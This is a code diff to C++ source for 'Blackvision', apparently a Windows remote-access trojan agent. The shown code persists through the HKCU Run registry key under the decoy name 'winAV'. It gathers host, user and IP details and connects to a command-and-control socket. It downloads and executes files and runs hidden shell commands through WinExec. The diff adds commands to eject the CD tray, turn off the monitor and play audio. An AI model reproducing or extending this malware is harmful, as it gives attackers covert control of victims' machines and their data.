@@ -1,6 +1,6 @@
 //#include "pch.h"
 #include "blackvision.h"
-//#pragma warning (disable : 4996) enable this if in vs
+//#pragma warning (disable : 4996) 
 
 void Blackvision::reconnect()
 {
@@ -18,11 +18,11 @@ void Blackvision::startup()
 	{
 		return;
 	}
-	if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal) != ERROR_SUCCESS)
+	if (RegOpenKey(HKEY_CURRENT_USER, (LPCSTR)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal) != ERROR_SUCCESS)
 	{
 		return;
 	}
-	if (RegSetValueEx(NewVal, "winAV", 0, REG_SZ, (LPBYTE)file, sizeof(file)) != ERROR_SUCCESS)
+	if (RegSetValueEx(NewVal, (LPCSTR)"winAV", 0, REG_SZ, (LPBYTE)file, sizeof(file)) != ERROR_SUCCESS)
 	{
 		return;
 	}
@@ -31,8 +31,10 @@ void Blackvision::startup()
 		// Do nothing, Program was added to Startup
 	}
 	RegCloseKey(NewVal);
-	
+
 }
+
+
 
 void Blackvision::ExecuteFile(char* filename)
 {
@@ -41,7 +43,7 @@ void Blackvision::ExecuteFile(char* filename)
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
-	CreateProcess(filename, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	CreateProcess((LPCSTR)filename, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
 }
@@ -83,7 +85,7 @@ std::string Blackvision::GetSysinfo()
 		break;
 	case 6:
 		if (osinfo.dwMinorVersion == 3)
-		{ 
+		{
 			sysinfo = "Windows 8.1 ";
 		}
 		else if (osinfo.dwMinorVersion == 2)
@@ -114,8 +116,8 @@ std::string Blackvision::GetSysinfo()
 		filelocation = DIR;
 	}
 
-	returnme = "\n[+] Operating System : " + sysinfo + "\n[+] RAM : " + RAM + " mb" + "\n[+] User-PC : " + username +"/"+ hostname + "\n[+] Agent Location : " + filelocation;
-	return returnme;	
+	returnme = "\n[+] Operating System : " + sysinfo + "\n[+] RAM : " + RAM + " mb" + "\n[+] User-PC : " + username + "/" + hostname + "\n[+] Agent Location : " + filelocation;
+	return returnme;
 }
 
 void Blackvision::recvFile()
@@ -143,7 +145,7 @@ void Blackvision::Wanip()
 	wanip[rSize] = '\0';
 
 	InternetCloseHandle(hFile);
-	InternetCloseHandle(hInternet); 
+	InternetCloseHandle(hInternet);
 }
 
 // Split string using C Method. I'm using it. Do whatever you want!
@@ -180,7 +182,7 @@ void Blackvision::ConnectionManage()
 			// std::cout << "Receiving File " << file_commands[1] << std::endl;
 			recvFile();
 			// std::cout << "Got File." << std::endl;
-			
+
 		}
 		else if (command == "wanip\n") {
 			respond((const char*)wanip);
@@ -207,7 +209,8 @@ void Blackvision::ConnectionManage()
 		else if (command == "username")
 		{
 			respond(username);
-		} else if(command == "kill")
+		}
+		else if (command == "kill")
 		{
 			connected = false;
 		}
@@ -218,15 +221,42 @@ void Blackvision::ConnectionManage()
 			WinExec(cmd[1], SW_HIDE);
 			respond("Command Executed.");
 		}
+		else if (command == "cdopen")
+		{
+			mciSendStringA("set cdaudio door open", NULL, 0, 0);
+			respond("CD Rom Ejected.");
+		}
+		else if (command == "cdclose")
+		{
+			mciSendStringA("set cdaudio door close", NULL, 0, 0);
+			respond("CD Rom Closed.");
+		}
+		else if (command == "monitoroff")
+		{
+			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
+			respond("Monitor is now off.");
+		}
+		else if (command == "monitoron")
+		{
+			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
+			respond("Monitor is now on.");
+		}
+		else if (command.find("playaudio") != std::string::npos)
+		{
+			strsplit(recvbuf, audio);
+			PlaySound(audio[1], NULL, SND_FILENAME | SND_ASYNC);
+			std::string ans = "Will now play " + std::string(audio[1]);
+			respond(ans.c_str());
+		}
 		else {
 			/*
-			Unidentified Command 
-			No response - 
+			Unidentified Command
+			No response -
 			*/
 		}
 	}
 
-	if(!connected)
+	if (!connected)
 	{
 		reconnect();
 	}
@@ -245,7 +275,7 @@ void Blackvision::respond(const char * data) {
 
 void Blackvision::C2Connect()
 {
-	while(true)
+	while (true)
 	{
 		WSADATA wsa;
 		DWORD timeout = 1000;
@@ -258,7 +288,7 @@ void Blackvision::C2Connect()
 			return;
 		}
 		setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
-		
+
 		server.sin_addr.s_addr = inet_addr("127.0.0.1");
 		server.sin_port = htons(3567);
 		server.sin_family = AF_INET;
@@ -273,8 +303,8 @@ void Blackvision::C2Connect()
 				// std::cout << "Connection Established." << std::endl;
 			}
 		} while (!connected); // Not Connected, While not connected.
-		
+
 		ConnectionManage();
 	}
-	
+
 }
